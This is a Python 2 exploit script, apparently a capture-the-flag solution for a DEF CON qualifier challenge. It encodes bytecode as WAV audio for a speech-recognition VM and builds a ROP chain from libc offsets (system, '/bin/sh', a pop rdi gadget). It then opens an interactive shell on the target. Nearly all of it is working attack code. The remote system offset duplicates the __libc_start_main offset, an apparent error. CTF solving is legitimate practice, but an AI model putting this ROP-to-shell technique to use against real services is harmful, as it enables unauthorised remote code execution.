#!/usr/bin/env python2
import os
import socket
import struct
import sys
import telnetlib
import zlib

if sys.argv[1] == 'local':
    TARGET = ('localhost',4444)

    # SHA-1 97623171c45160ec3d338d3f46bbd7df39388c81 from Ubuntu 16.04
    offset___libc_start_main_ret = 0x20830
    offset_system = 0x0000000000045390
    offset_str_bin_sh = 0x18c177
    offset_pop_rdi = 0x001745ae

else:
    TARGET = ('insanity_thereisnorightandwrongtheresonlyfunandboring.quals.shallweplayaga.me', 18888)

    # SHA-1 abcda3d9548f3fbdea4bbd1f4d3cc44c3866457f from Ubuntu 14.04.4
    offset___libc_start_main_ret = 0x21ec5
    offset_system = 0x21ec5
    offset_str_bin_sh = 0x17ccdb
    offset_pop_rdi = 0x00165e1f

sounds_dir = os.path.abspath(os.path.dirname(__file__)) + '/sounds'
sound_files = [None]
sound_files += ['%s/raw_%d.wav' % (sounds_dir, i) for i in range(1,6)]
sound_files += ['%s/short_%d.wav' % (sounds_dir, i) for i in range(6,9)]

def get_sound(num):
    samples = 0
    block = []
    with open(sound_files[num]) as f:
        f.read(0xe0) # consume header
        while True:
            lo = f.read(1)
            if not lo: break
            hi = f.read(1)
            # we pack the 16-bit word into one byte via rounding
            lo = ord(lo)
            hi = ord(hi)
            if lo > 0x100/2:
                hi+=1
            hi = min(hi,0xff)
            # somehow everything gets XOR'ed with 0x80
            block.append(chr(hi^0x80))
            samples+=1
    assert samples <= 0x10000
    return ''.join(block)

def pack_chunk(chunk):
    chunk = zlib.compress(chunk)
    return struct.pack('<I', len(chunk)) + chunk

def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def mk_stage1():
    code = []
    data = []

    def add(v):
        code.append(2)
        data.append(v)

    def mul(v):
        code.append(4)
        data.append(v)

    def jmp():
        code.append(8)

    def push(v):
        data.append(v)

    def calc(v):
        """Calculate v on the stack."""
        def calc_rec(v):
            if v != 0:
                calc_rec(v >> 1)
                mul(2)
                if v % 2 == 1:
                    add(1)
        calc_rec(v)

    calc(17362)
    push(1)
    jmp()

    program = code + data[::-1]
    print '[*] Stage1 = ', program
    res = ''
    for value in program:
        res += pack_chunk(get_sound(value))
    return res


def mk_stage2():
    code = []

    def exit():
        code.append(0)

    def add():
        code.append(2)

    def load(i):
        assert(i < 2)
        code.append(6)
        code.append(i)

    def store():
        code.append(7)

    def push(v):
        code.append(v + 10)

    # Load return address into __libc_start_main
    push(33779)
    load(0)
    # Add offset
    push(offset_system - offset___libc_start_main_ret)
    add()
    # Store new address inside ROP chain
    push(33781)
    store()

    push(33779)
    load(0)
    push(offset_str_bin_sh - offset___libc_start_main_ret)
    add()
    push(33780)
    store()

    push(33779)
    load(0)
    push(offset_pop_rdi - offset___libc_start_main_ret)
    add()
    push(33779)
    store()

    # trigger ROP chain
    exit()

    chunk = ''.join(map(lambda x: struct.pack('<Q', x), code))

    # we need to append some more data so that pocketsphinx detects something and
    # does not return NULL. Not sure why, but apparently random data seems to work.
    chunk += pack_chunk(get_sound(1))
    return pack_chunk(chunk)


s = socket.create_connection(TARGET)
s.sendall(mk_stage1())
s.sendall(mk_stage2())
s.sendall(struct.pack('<I', 0))
interact(s)
